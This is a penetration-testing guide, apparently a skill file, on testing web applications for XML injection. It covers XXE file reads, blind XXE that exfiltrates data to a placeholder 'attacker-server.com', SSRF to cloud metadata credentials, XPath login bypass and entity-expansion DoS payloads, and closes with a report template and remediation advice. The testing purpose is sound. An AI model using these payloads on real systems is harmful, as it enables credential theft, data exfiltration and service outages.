---
name: testing-for-xml-injection-vulnerabilities
description: Test web applications for XML injection vulnerabilities including XXE, XPath injection, and XML entity attacks to identify data exposure and server-side request forgery risks.
domain: cybersecurity
subdomain: web-application-security
tags: [xml-injection, xxe, xpath-injection, xml-parsing, web-security, entity-injection, dtd-attack]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Testing for XML Injection Vulnerabilities

## When to Use
- When testing applications that process XML input (SOAP APIs, XML-RPC, file uploads)
- During penetration testing of applications with XML parsers
- When assessing SAML-based authentication implementations
- When testing file import/export functionality that handles XML formats
- During API security testing of SOAP or XML-based web services

## Prerequisites
- Burp Suite with XML-related extensions (Content Type Converter, XXE Scanner)
- XMLLint or similar XML validation tools
- Understanding of XML structure, DTDs, and entity processing
- Python 3.x with lxml and requests libraries
- Access to an out-of-band interaction server (Burp Collaborator, interact.sh)
- Sample XXE payloads from PayloadsAllTheThings repository

## Workflow

### Step 1 — Identify XML Processing Endpoints
```bash
# Look for endpoints accepting XML content types
# Content-Type: application/xml, text/xml, application/soap+xml
# Check WSDL files for SOAP services
curl -s http://target.com/service?wsdl

# Test if endpoint accepts XML by changing Content-Type
curl -X POST http://target.com/api/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><test>hello</test></root>'

# Check for XML file upload functionality
# Look for .xml, .svg, .xlsx, .docx file processing
```

### Step 2 — Test for Basic XXE (File Retrieval)
```xml
<!-- Basic XXE to read local files -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- Windows file retrieval -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>

<!-- Using PHP wrapper for base64-encoded file content -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### Step 3 — Test for Blind XXE with Out-of-Band Detection
```xml
<!-- Out-of-band XXE using external DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker-server.com/xxe.dtd">
  %xxe;
]>
<root><data>test</data></root>

<!-- External DTD file (xxe.dtd hosted on attacker server) -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker-server.com/?data=%file;'>">
%eval;
%exfil;

<!-- DNS-based out-of-band detection -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-test.burpcollaborator.net">
]>
<root><data>&xxe;</data></root>
```

### Step 4 — Test for SSRF via XXE
```xml
<!-- Internal network scanning via XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>

<!-- AWS metadata endpoint access -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>

<!-- Internal port scanning -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root><data>&xxe;</data></root>
```

### Step 5 — Test for XPath Injection
```bash
# Basic XPath injection in search parameters
curl "http://target.com/search?query=' or '1'='1"

# XPath authentication bypass
curl -X POST http://target.com/login \
  -d "username=' or '1'='1&password=' or '1'='1"

# XPath data extraction
curl "http://target.com/search?query=' or 1=1 or ''='"

# Blind XPath injection with boolean-based extraction
curl "http://target.com/search?query=' or string-length(//user[1]/password)=8 or ''='"
curl "http://target.com/search?query=' or substring(//user[1]/password,1,1)='a' or ''='"
```

### Step 6 — Test for XML Billion Laughs (DoS)
```xml
<!-- Billion Laughs attack (use only in authorized testing) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root><data>&lol4;</data></root>

<!-- Quadratic blowup attack -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
]>
<root>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</root>
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| XXE (XML External Entity) | Attack exploiting XML parsers that process external entity references |
| Blind XXE | XXE where response is not reflected; requires out-of-band channels |
| XPath Injection | Injection into XPath queries used to navigate XML documents |
| DTD (Document Type Definition) | Declarations that define XML document structure and entities |
| Parameter Entities | Special entities (%) used within DTDs for blind XXE exploitation |
| SSRF via XXE | Using XXE to make server-side requests to internal resources |
| XML Bomb | Denial of service via recursive entity expansion (Billion Laughs) |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| Burp Suite | HTTP proxy with XXE Scanner extension for automated detection |
| XXEinjector | Automated XXE injection and data exfiltration tool |
| OXML_XXE | Tool for embedding XXE payloads in Office XML documents |
| xmllint | XML validation and parsing utility for payload testing |
| interact.sh | Out-of-band interaction server for blind XXE detection |
| Content Type Converter | Burp extension to convert JSON requests to XML for XXE testing |

## Common Scenarios

1. **File Disclosure** — Read sensitive server files (/etc/passwd, web.config) through classic XXE entity injection in XML input fields
2. **SSRF to Cloud Metadata** — Access AWS/GCP/Azure metadata endpoints through XXE to steal IAM credentials and access tokens
3. **Blind Data Exfiltration** — Extract sensitive data through out-of-band DNS/HTTP channels when XXE output is not reflected
4. **SAML XXE** — Inject XXE payloads into SAML assertions during single sign-on authentication flows
5. **SVG File Upload XXE** — Upload malicious SVG files containing XXE payloads to trigger server-side XML parsing

## Output Format

```
## XML Injection Assessment Report
- **Target**: http://target.com/api/xml-endpoint
- **Vulnerability Types Found**: XXE, Blind XXE, XPath Injection
- **Severity**: Critical

### Findings
| # | Type | Endpoint | Payload | Impact |
|---|------|----------|---------|--------|
| 1 | XXE File Read | POST /api/import | SYSTEM "file:///etc/passwd" | Local File Disclosure |
| 2 | Blind XXE | POST /api/upload | External DTD with OOB | Data Exfiltration |
| 3 | SSRF via XXE | POST /api/parse | SYSTEM "http://169.254.169.254/" | Cloud Credential Theft |

### Remediation
- Disable external entity processing in XML parser configuration
- Use JSON instead of XML where possible
- Implement XML schema validation with strict DTD restrictions
- Block outbound connections from XML processing services
```
